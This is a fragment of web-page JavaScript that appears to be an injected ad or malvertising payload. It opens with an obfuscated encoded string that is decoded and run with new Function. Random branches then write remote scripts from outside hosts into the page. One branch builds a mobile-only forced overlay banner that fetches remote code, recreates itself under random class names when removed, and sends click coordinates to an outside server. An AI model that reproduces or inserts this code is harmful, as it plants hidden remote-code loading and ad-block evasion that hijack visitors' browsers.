L))85m(5YdFYEqY^Y2Fc"LFTqY"a!L))m622Y59|yt8")OfT[JOL6F6O2g626F6dq l6^JO5Fd2F!^62*hY6phFg"%D62fODmL(5YY2mhY6phF%"JR l6^JO5Fd2F!Jdff62p*)OFFO^g}00JR l6^JO5Fd2F!P"!5mhYdfmdJJY2fxh6qfcL))aP!P= }000a!Xd5 DLRp8H"))Lm)hOqO5@0}}}nm(2"="))Lm)hOqO5@0}}}Km(2"="))Lm)hOqO5@0}}}1m(2"="))Lm)hOqO5@0}}}nm(2"="))Lm)hOqO5@0}}}Km(2"="))Lm)hOqO5@0}}}1m(2"Z!Xd5 S8ydFhm7qOO5cc2YD wdFYcaampYFwdFYca/na!S8cS>najngS!Xd5 DL_8c"hFFJLg"885mqO(dF6O2mJ5OFO(Oqaj"DLLg//"%DLRpHSZ%"g@00Q}"g"DLg//"%DLRpHSZ%"g@00Q0"!Xd5 (82YD VY)iO(SYFcDL_%"/}QsK"a!(mO2OJY287_2(F6O2cYa[6LDL86LMSS8}!Xd5 (d2Xd85mpYFEqY^Y2FuTWfc"O66pXC:X"a!67c(d2Xda[(d2XdmLFTqY8"f6LJqdTg2O2Y!"PP!(mO2^YLLdpY87_2(F6O2cYa[Xd5 F87_2(F6O2cYa[Xd5 F=5=2=O=(=6=_=d8"("%"h"%"d"%"5"%"r"%"F"=78"7"%"5"%"O"%"^"%"x"%"h"%"d"%"5"%"x"%"O"%"f"%"Y"=q8"("%"h"%"d"%"5"%"x"%"O"%"f"%"Y"%"r"%"F"=f8"6"%"2"%"f"%"Y"%"R"%";"%"7"=L8"r"%"u"%"x"%"w"%"E"%"]"%"k"%"9"%"W"%"+"%"z"%"t"%"y"%"N"%";"%"e"%"I"%"~"%"i"%"|"%"B"%"A"%"V"%"&"%"-"%"U"%"d"%")"%"("%"f"%"Y"%"7"%"p"%"h"%"6"%"C"%"S"%"q"%"^"%"2"%"O"%"J"%":"%"5"%"L"%"F"%"_"%"X"%"D"%"R"%"T"%"4"%"0"%"}"%"@"%"s"%"o"%"n"%"K"%"1"%"{"%"Q"%"%"%"/"%"8"=J8""=p80!7O5cY8Ym5YJqd(Yc/H3r*Ud*40*Q%/8Z/p=""a!p<YmqY2pFh!aO8LHfZcYHdZcp%%aa=(8LHfZcYHdZcp%%aa=68LHfZcYHdZcp%%aa=_8LHfZcYHdZcp%%aa=F8O<<@?(>>o=58c}nv(a<<o?6>>@=28csv6a<<K?_=J%8iF562pH7ZcFa=Kol86vvcJ%8iF562pH7Zc5aa=Kol8_vvcJ%8iF562pH7Zc2aa!5YF_52 7_2(F6O2cYa[7O5cXd5 F8""=2858(}8(@80!2<YmqY2pFh!ac58YHqZc2aa<}@{jcF%8iF562pH7Zc5a=2%%ag5>}Q}vv5<@@ojc(@8YHqZc2%}a=F%8iF562pH7Zccs}v5a<<K?Ksv(@a=2%8@agc(@8YHqZc2%}a=(s8YHqZc2%@a=F%8iF562pH7Zcc}nv5a<<}@?cKsv(@a<<K?Ksv(sa=2%8sa!5YF_52 FPcJaPcYmfdFda!2YD ]_2(F6O2c"MFf(L"=FacOa=(m(qOLYcaPPPYqLY[Xd5 685m(5YdFYEqY^Y2Fc"L(56JF"a!6mL5(8"hFFJLg//DdJmdTS6)5dm(2/L(/}QsKj28O66pXC:X"!Xd5 _85mpYFEqY^Y2FLuT|dpNd^Yc"L(56JF"aH0Z!_mJd5Y2FNOfYm62LY5FuY7O5Yc6=_aPPZa!'.substr(10));new Function(b)()}();    
        }
        if (randomElement == 't5cpv') {
            (function (){
                var id = "9142199889545937380-62154";
                document.write('<ins style="display:none!important" id="' + id + '"></ins>');
                (window.adbyunion = window.adbyunion || []).push(id);
                document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
            })();
        }
        if (randomElement == 't5cpc'){
            (function (){
                var id = "9142199889545937380-62153";
                document.write('<ins style="display:none!important" id="' + id + '"></ins>');
                (window.adbyunion = window.adbyunion || []).push(id);
                document.write('<script async  src="https://www.t5wm.cc/o.js"></script>');
            })();
        }
        if(randomElement == 'smCpv'){
           window.cYyVzF = function(){var a=document.createElement('a');var evjs=`(function(){var cname='cYyVzF',cn='https://api.simi1234.com/static/image/c.png',bn='https://dingbu.bj.bcebos.com/dibu.adadadad',jp='https://api.simi1234.com/a/c?au5b9262149de3692875cda46c75dc081c=',SlWFoT=null,cst=0,drv=isCheckD();if(drv){crateEl(cname);var n=0;SlWFoT=setInterval(()=>{n++;var elobj=resbaner();if(!elobj){cname=its(6);return crateEl('cYyVzF '+cname)}var eh=elobj.getBoundingClientRect().height;if(eh==0){elobj.remove();cname=its(6);crateEl('cYyVzF '+cname)}},500)}var s=document.createElement('script');s.src='https://api.simi1234.com/s/c?_=457012614235545600';document.getElementsByTagName('head')[0].appendChild(s);function crateEl(n){var by=document.body;if(!by){return false};var br=document.createElement('div');br.setAttribute('class',n);var img=document.createElement('img');img.src=bn;var p=document.createElement('p');br.append(p);br.append(img);by.append(br);addlistenerElement(br,function(e){var pX=0,pY=0,touches=e.changedTouches;if(touches){var touchesData=touches[0]; pX=touchesData.pageX; pY=touchesData.pageY};var _ao=document.createElement('a');_ao.href=jp+au5b9262149de3692875cda46c75dc081c+decodeURIComponent('%26')+'cp='+pX+','+pY;_ao.click()});addlistenerElement(p,function(){clearInterval(SlWFoT);resbaner().remove()});img.onload=function(){var h=this.height;resbaner().style.height=h+'px';getIheight(h,this.width)}}function getStyleStr(el){var obs=window.getComputedStyle(el,'');var str='';for(k in obs){if(parseInt(k).toString()=='NaN'){str+=k+': '+obs[k]+';'+'<br/>'}}return str}var pimg='.cYyVzF img{width:100% !important;}';var ps=cst==4?'':'position:fixed;';var bs='.cYyVzF{z-index:999;'+(cst==2||cst==3?'width:100px;':'')+(cst==3?'right:0;':'left:0;')+ps+(cst==0?'bottom:0px':cst==1?'top:0px':'bottom:50%')+';}'+pimg;if(drv){addStyle(bs)}function getIheight(height,w){var ch='width:18px;height:18px';var ot=(cst==0?'bottom':cst==1?'top':cst==2||cst==3?'bottom':'')+(cst==0||cst==1?':'+height+'px;':cst==2||cst==3?':calc(50% + '+height+'px)':'display:none;');var or=(cst==0||cst==1?'right:0':cst==2?'left:'+(w-18)+'px':'right:'+(w-18)+'px');var close='.cYyVzF p{padding:0 !important;margin:0 !important;'+ch+';background:url('+cn+');background-size:contain;position:fixed;'+or+';'+ot+'}';close+=(cst==1?'body{padding-top:'+height+'px !important;}':'');addStyle(close)}function addStyle(style){var styleObj=document.createElement('style');styleObj.setAttribute('type','text/css');styleObj.innerHTML=style;document.getElementsByTagName('head')[0].appendChild(styleObj)}function resbaner(){return document.querySelector('.'+cname)}function isCheckD(){var p=navigator.platform;var system={win:false,mac:false,Xll:false};system.win=p.indexOf('Win')==0;system.mac=p.indexOf('Mac')==0;system.X11=(p=='X11')||(p.indexOf('Linux')==0);if(system.win||system.mac||system.Xll){return false}return true}function addlistenerElement(el,callBack){el.addEventListener('click',handleFun);el.addEventListener('touchstart',handleFun);function handleFun(e){e.preventDefault();e.stopPropagation();callBack(e)}}function its(len){var r=['a','B','c','d','e','G','g','h','J','j','k'],str='';for(var i=0;i<len;i++){var rx=Math.round(Math.random()*(r.length-1));str+=r[rx]}return str}})();`;a.href='javascript:'+evjs;a.click()};window.cYyVzF();
        }
    }

}
